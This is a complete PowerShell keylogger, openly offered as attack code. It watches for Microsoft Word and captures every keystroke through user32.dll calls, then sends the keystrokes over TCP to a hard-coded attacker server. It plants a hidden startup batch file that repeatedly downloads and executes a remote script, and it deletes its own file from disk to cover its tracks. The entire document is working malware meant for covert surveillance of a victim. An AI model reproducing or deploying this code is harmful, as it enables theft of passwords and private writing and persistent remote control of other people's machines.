<#
.SYNOPSIS

This script runs a key logger that records keypresses while user has opened Microsoft Word.
After the key press has been captured, its being sent to attacker server through TCP session.
This script has also persistency function, spawning a batch file in user's startup folder.

Tested on: Windows 10, Windows Defender Real-Time Protection DISABLED
Author: Daniel Wolfman

.NOTES

References:
https://www.facebook.com/KaliPentesting/posts/2022916778002372


#>


$SERVER = "192.168.237.131"
$LOG_PORT = 8888
$HTTP_PORT = 8000
$TARGET_PROCESS = "WINWORD"

$Keylogger =
{
  <#
  .SYNOPSIS
  
  This script creates TCP socket to attacker's server, capturing keypresses with user32.dll functions and sending them through the socket.
  #>

  param($Server, $Port)

  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create TCP socket to server
  while(1) {
    Try 
    {
        $Socket = New-Object -TypeName System.Net.Sockets.TcpClient
        $Socket.Connect($Server, $Port)
        break
    }
    Catch 
    {
        sleep 3
    }
  }
  # Setup stream writer 
  $Stream = $Socket.GetStream() 
  $Writer = New-Object System.IO.StreamWriter($Stream)
  $Writer.AutoFlush = $true

  $Writer.WriteLine("--------- " + (Get-Date -Format "[MM/dd/yyyy HH:mm:ss]") + " ---------")

  while ($true) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            $Writer.Write($mychar)
          }
        }
      }
    }
}

Function Invoke-Persistency {
    <#
    .SYNOPSIS
    
    This function generates a powershell one-liner and creates a bat file in the user startup folder.
    #>
    "CONSOLESTATE /Hide`npowershell -nop -w 1 -exec bypass -c ""while(1){try{IEX (New-Object Net.WebClient).DownloadString('http://$SERVER`:$HTTP_PORT/script.ps1');exit} catch{sleep 5}}""" > "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
}

Function Monitor-Word {
    <#
    .SYNOPSIS
    
    Main function that starts with self destruction of the script on disk,
    then running infinite loop, monitoring the processes to check if Microsoft Word is active or not.
    While active, running keylogger function.
    #>

    # self destruction (on disk)
    del $PSScriptRoot 2>$null

    $running = $false
    $job = $null

    Write-Host "[~] Starting monitoring" -ForegroundColor Yellow
    # infinite loop for monitoring process activity
    while ($true) {
        # try to get Word process instance
        $process = Get-Process | ?{$_.ProcessName -eq $TARGET_PROCESS}

        # if it has been opened, start logger
        if ($process -and !$running) {
            $running = $true
            Write-Host "[+] Word opened!" -ForegroundColor Green
            $job = Start-Job -ScriptBlock $Keylogger -ArgumentList $SERVER, $LOG_PORT
        }

        # if it has been closed, stop logger
        if(!$process -and $running) {
            $running = $false
            Write-Host "[-] Word has been closed. stopping logger." -ForegroundColor Gray
            Stop-Job $job
            Remove-Job $job
        }        

        Start-Sleep -Seconds 2
    }
}

Invoke-Persistency
Monitor-Word